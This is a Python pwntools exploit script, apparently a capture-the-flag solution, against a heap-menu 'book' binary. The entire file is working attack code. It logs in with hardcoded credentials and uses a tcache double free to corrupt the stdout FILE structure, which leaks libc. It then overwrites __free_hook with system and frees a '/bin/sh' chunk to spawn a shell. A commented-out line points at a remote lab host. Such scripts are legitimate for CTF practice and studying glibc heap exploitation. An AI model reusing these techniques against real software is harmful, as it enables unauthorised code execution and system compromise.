from pwn import *

p = process('./pwn')
#p = remote('90b826377a05d5e9508314e76f2f1e4e.kr-lab.com',40001)
elf = ELF('./pwn')
libc = ELF('./libc.so')
context.log_level = 'debug'

p.recvuntil('username:')
p.sendline('admin')
p.recvuntil('password:')
p.sendline('frame')

def create(name,size,context):
    p.sendlineafter('>\n','1')
    p.sendafter('book name:',name)
    p.sendlineafter('description size:',str(size))
    p.sendafter('description:',context)

def createe(name,size,context):
    p.sendlineafter('>','1')
    p.sendafter('book name:',name)
    p.sendlineafter('description size:',str(size))
    p.sendafter('description:',context)

def delete(index):
    p.sendlineafter('>\n','2')
    p.sendlineafter('index:',str(index))

def deletee(index):
    p.sendlineafter('>','2')
    p.sendlineafter('index:',str(index))

#tcathe attack to the IO_File
create('A',0x68,'A'*0x68)
delete(0)
delete(0)
create('A',0x68,p64(0x602020))
create('A',0x68,'A')
create('A',0x68,'\x60')
create('A',0x68,p64(0xfbad1800)+p64(0)*3+'\x90')

#leak the libc
data = u64(p.recv(6).ljust(8,'\x00'))
libc_base = data - 4114403
system_addr = libc_base + libc.symbols['system']
free_addr = libc_base + libc.symbols['__free_hook']
log.success('libc base is :'+hex(libc_base))

#tcache attack to __free_hook
createe('A',0x30,'A')#5
deletee(5)
deletee(5)
createe('A',0x30,p64(free_addr))#6
createe('A',0x30,'/bin/sh')#7
createe('A',0x30,p64(system_addr))#8

#trigger
deletee(7)

p.interactive()
